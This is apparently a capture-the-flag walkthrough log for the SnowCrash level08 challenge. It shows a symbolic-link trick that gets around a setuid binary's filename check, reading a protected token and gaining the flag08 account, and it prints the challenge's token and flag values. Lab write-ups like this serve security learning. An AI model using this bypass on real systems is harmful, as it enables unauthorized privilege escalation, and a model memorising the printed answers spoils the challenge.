level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token



we have level08 and token as potentially interesting files

level08@SnowCrash:~$ ./level08 
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token
You may not access 'token'


we make a symbolic link to /tmp

ln -s /home/user/level08/token /tmp/flag08


level08@SnowCrash:~$ ./level08 /tmp/flag08
quif5eloekouj29ke0vouxean


level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !


flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f